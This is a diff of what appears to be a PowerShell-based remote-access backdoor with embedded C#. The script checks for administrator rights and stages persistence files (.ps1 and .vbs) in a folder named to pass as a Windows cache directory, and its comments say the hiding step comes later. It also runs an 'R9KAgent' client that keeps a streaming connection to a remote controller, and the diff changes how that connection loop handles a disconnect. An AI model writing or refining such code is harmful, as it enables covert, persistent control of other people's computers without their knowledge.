@@ -13,7 +13,6 @@ if (-not $isAdmin) {
 }
 Write-Host "[2] Admin OK." -ForegroundColor Green
 
-# Prepara a persistência (não esconde ainda)
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
@@ -77,9 +76,7 @@ if (-not ("R9KAgent" -as [type])) {
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
 
                     while (myClient.Connected) {
-                        // Correção aqui: usando myClient.Client no lugar de myStream.Socket
-                        if (myClient.Client.Poll(1000, SelectMode.SelectRead) && myClient.Client.Available == 0) break;
-                        Thread.Sleep(100);
+                        Thread.Sleep(500);
                     }
                 } catch (Exception ex) { 
                     Console.WriteLine("[!] ERRO: " + ex.Message);
